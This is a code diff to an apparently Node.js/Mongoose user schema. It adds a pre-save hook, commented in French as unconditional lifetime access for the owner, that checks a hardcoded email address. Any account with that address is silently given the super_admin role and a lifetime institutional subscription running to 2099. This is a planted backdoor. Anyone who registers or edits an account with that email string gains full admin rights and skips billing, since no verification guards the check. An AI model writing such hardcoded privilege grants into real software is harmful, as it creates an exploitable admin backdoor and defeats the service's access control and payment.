@@ -101,6 +101,16 @@ const userSchema = new mongoose.Schema({
 });
 
 userSchema.pre('save', async function(next) {
+  // Accès à vie inconditionnel pour le compte propriétaire
+  if (this.email && this.email.toLowerCase().trim() === 'valdeslando15@gmail.com') {
+    this.role = 'super_admin';
+    if (!this.subscription) this.subscription = {};
+    this.subscription.plan = 'institutional';
+    this.subscription.billingCycle = 'lifetime';
+    this.subscription.isActive = true;
+    this.subscription.endDate = new Date('2099-12-31');
+  }
+
   if (!this.isModified('password')) return next();
   const salt = await bcrypt.genSalt(12);
   this.password = await bcrypt.hash(this.password, salt);
